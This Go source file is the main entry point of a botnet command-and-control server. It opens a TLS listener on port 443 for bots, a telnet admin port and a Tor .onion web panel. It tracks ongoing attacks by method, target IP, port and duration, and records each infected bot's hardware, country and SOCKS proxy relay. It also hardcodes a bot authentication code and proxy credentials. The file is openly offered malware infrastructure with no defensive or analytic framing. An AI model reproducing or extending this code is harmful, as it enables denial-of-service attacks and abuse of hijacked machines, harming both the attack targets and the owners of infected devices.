package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// usersFile is resolved at init to support running from project root or cnc dir.
// Canonical location is cnc/db/users.json; falls back to legacy paths for migration.
var usersFile string

func init() {
	// Check legacy locations first so existing deployments migrate automatically
	for _, path := range []string{"cnc/db/users.json", "cnc/users.json", "users.json"} {
		if _, err := os.Stat(path); err == nil {
			usersFile = path
			return
		}
	}
	// Default for new installs — db/ directory
	usersFile = dbPath("users.json")
}

const (
	// Server IPs
	USER_SERVER_IP = "0.0.0.0"
	BOT_SERVER_IP  = "0.0.0.0"

	// run setup.py dont try to change this yourself

	// Server ports
	BOT_SERVER_PORT  = "443" // do not change
	USER_SERVER_PORT = "420"

	// Authentication  these must match bot
	MAGIC_CODE       = "McDPahp5&tAo$F1y"
	PROTOCOL_VERSION = "r4.6-stable"
)

var bakedProxyUser = "7emOZVbqgcAC" // change me run setup.py
var bakedProxyPass = "BUdiLg8CT4Nt" // change me run setup.py

// RelayEntry represents a relay in relays.json.
type RelayEntry struct {
	ID          string    `json:"id"`
	Name        string    `json:"name"`
	Host        string    `json:"host"`
	ControlPort string    `json:"controlPort"`
	SocksPort   string    `json:"socksPort"`
	AddedAt     time.Time `json:"addedAt"`
}

// RelayStats holds the most-recently-reported stats from a relay.
type RelayStats struct {
	Name           string    `json:"name"`
	ActiveConns    int64     `json:"activeConns"`
	TotalSessions  int64     `json:"totalSessions"`
	BytesUp        int64     `json:"bytesUp"`
	BytesDown      int64     `json:"bytesDown"`
	FailedSessions int64     `json:"failedSessions"`
	ConnectedBots  int64     `json:"connectedBots"`
	UptimeSecs     int64     `json:"uptimeSecs"`
	LastSeen       time.Time `json:"lastSeen"`
	Up             bool      `json:"up"`
}

var (
	relaysMu        sync.RWMutex
	relaysCache     []RelayEntry
	relayStatsMu    sync.RWMutex
	relayStatsCache = map[string]RelayStats{}
)

// dbPath returns the path to a file inside the cnc/db directory,
// resolving relative to whichever working directory the binary runs from.
func dbPath(name string) string {
	for _, base := range []string{"cnc/db", "db"} {
		p := base + "/" + name
		if _, err := os.Stat(base); err == nil {
			return p
		}
	}
	return "db/" + name
}

// loadRelaysFromDisk reads cnc/db/relays.json into relaysCache.
func loadRelaysFromDisk() {
	path := dbPath("relays.json")
	data, err := os.ReadFile(path)
	if err != nil {
		// File missing — start empty, will be created on first write
		return
	}
	var entries []RelayEntry
	if err := json.Unmarshal(data, &entries); err == nil {
		relaysMu.Lock()
		relaysCache = entries
		relaysMu.Unlock()
	}
}

// saveRelaysToDisk writes relaysCache to cnc/db/relays.json atomically.
func saveRelaysToDisk() error {
	relaysMu.RLock()
	data, err := json.MarshalIndent(relaysCache, "", "  ")
	relaysMu.RUnlock()
	if err != nil {
		return err
	}
	path := dbPath("relays.json")
	os.MkdirAll(strings.TrimSuffix(path, "/relays.json"), 0755)
	return os.WriteFile(path, data, 0644)
}

type BotConnection struct {
	conn          net.Conn
	botID         string
	connectedAt   time.Time
	lastPing      time.Time
	authenticated bool
	arch          string
	ip            string
	ram           int64    // RAM in MB
	cpuCores      int      // CPU cores
	processName   string   // Running process name
	uplinkMbps    float64  // Uplink speed in Mbps
	country       string   // GeoIP country code
	userConn      net.Conn // Track which user is controlling this bot
	socksActive   bool
	socksRelay    string
	socksUser     string
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

type attack struct {
	method   string
	ip       string
	port     string
	duration time.Duration
	start    time.Time
	username string
}

type Credential struct {
	Username string `json:"Username"`
	Password string `json:"Password"`
	Expire   string `json:"Expire"`
	Level    string `json:"Level"`
}

var (
	ongoingAttacks     = make(map[int]attack)
	ongoingAttacksLock sync.RWMutex
	ongoingAttackSeq   int
	botConnections     = make(map[string]*BotConnection)
	botConnsLock       sync.RWMutex
	botCount           int
	commandOrigin      = make(map[string]net.Conn) // botID -> user connection that sent command
	originLock         sync.RWMutex
	clientsLock        sync.RWMutex
	tuiMode            bool      // Global flag for TUI mode
	c2StartTime        time.Time // When the C2 server was started
)

// logMsg prints a message only if not in TUI mode (avoids messing up TUI display)
func logMsg(format string, args ...interface{}) {
	if !tuiMode {
		fmt.Printf(format+"\n", args...)
	}
}

var (
	clients    = []*client{}
	maxAttacks = 20
)

// ============================================================================
// MAIN ENTRY POINT
// 3-way C2: TUI (local), Web Panel (Tor .onion), Telnet (remote CLI)
// Creates default root user if users.json doesn't exist.
// ============================================================================

func main() {
	c2StartTime = time.Now()
	loadRelaysFromDisk()

	// Parse CLI flags
	var runTUI, runWebTor, runSplit bool
	for _, arg := range os.Args[1:] {
		switch arg {
		case "--tui":
			runTUI = true
		case "--web":
			fmt.Println("[WIP] Web panel is not yet available")
		case "--split":
			runSplit = true
		case "--daemon":
			runSplit = true
		}
	}

	// No flags = show interactive launcher
	if !runTUI && !runWebTor && !runSplit {
		choices := RunLauncher()
		runTUI = choices.TUI
		runWebTor = choices.WebTor
		runSplit = choices.Split
	}

	// Nothing selected = exit
	if !runTUI && !runWebTor && !runSplit {
		fmt.Println("[☾℣☽] No mode selected, exiting.")
		return
	}

	tuiMode = runTUI && !runSplit && !runWebTor

	// First run: Create default root user with random 12-char password
	if _, fileError := os.ReadFile(usersFile); fileError != nil {
		password, err := randomString(12)
		if err != nil {
			fmt.Println("Error generating password:", err)
			return
		}

		rootUser := User{
			Username: "root",
			Password: password,
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    "Owner",
		}

		bytes, err := json.Marshal([]User{rootUser})
		if err != nil {
			fmt.Println("Error marshalling user data:", err)
			return
		}

		if err := os.WriteFile(usersFile, bytes, 0600); err != nil {
			fmt.Println("Error writing to users.json:", err)
			return
		}
		fmt.Println("[☾℣☽] Login with username", rootUser.Username, "and password", rootUser.Password)
	}

	// Backfill API keys for any users that don't have one
	BackfillAPIKeys()

	// Load TLS configuration
	logMsg("[INFO] Loading TLS certificates...")
	tlsConfig := loadTLSConfig()
	logMsg("[INFO] TLS configuration loaded successfully")

	// Start background tasks
	go cleanupDeadBots()
	go cleanupExpiredSessions()
	go sampleStats()

	// Start bot server (TLS ONLY)
	go func() {
		logMsg("[☾℣☽] Bot TLS server starting on %s:%s", BOT_SERVER_IP, BOT_SERVER_PORT)
		botListener, err := tls.Listen("tcp", BOT_SERVER_IP+":"+BOT_SERVER_PORT, tlsConfig)
		if err != nil {
			fmt.Println("[FATAL] Error starting bot TLS server:", err)
			os.Exit(1)
		}
		defer botListener.Close()

		logMsg("[☾℣☽] Bot TLS server is running on port 443")

		for {
			conn, err := botListener.Accept()
			if err != nil {
				logMsg("Error accepting bot TLS connection: %v", err)
				continue
			}
			go validateTLSHandshake(conn)
		}
	}()

	// Start Web Panel over Tor (if selected)
	if runWebTor {
		go func() {
			handler := NewWebMux()
			if err := StartTorWebServer(handler); err != nil {
				fmt.Printf("[TOR] Error: %v\n", err)
				// Fallback: try clearnet on port 8080
				fmt.Println("[WEB] Falling back to clearnet on :8080")
				srv := &http.Server{Addr: ":8080", Handler: handler}
				if err := srv.ListenAndServe(); err != nil {
					fmt.Printf("[WEB] Clearnet fallback failed: %v\n", err)
				}
			}
		}()
	}

	// Start Telnet/Split server (if selected)
	if runSplit {
		go func() {
			logMsg("[☾℣☽] Admin CLI server starting on %s:%s", USER_SERVER_IP, USER_SERVER_PORT)
			userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
			if err != nil {
				fmt.Println("Error starting user server:", err)
				return
			}
			defer userListener.Close()

			go updateTitle()

			for {
				conn, err := userListener.Accept()
				if err != nil {
					logMsg("Error accepting user connection: %v", err)
					continue
				}
				logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())
				go handleRequest(conn)
			}
		}()
	}

	// Start TUI (if selected) — blocks until exit
	if runTUI {
		time.Sleep(500 * time.Millisecond)
		if err := StartTUI(); err != nil {
			fmt.Println("Error running TUI:", err)
			os.Exit(1)
		}
		return
	}

	// No TUI — block forever (web/split run in goroutines)
	select {}
}
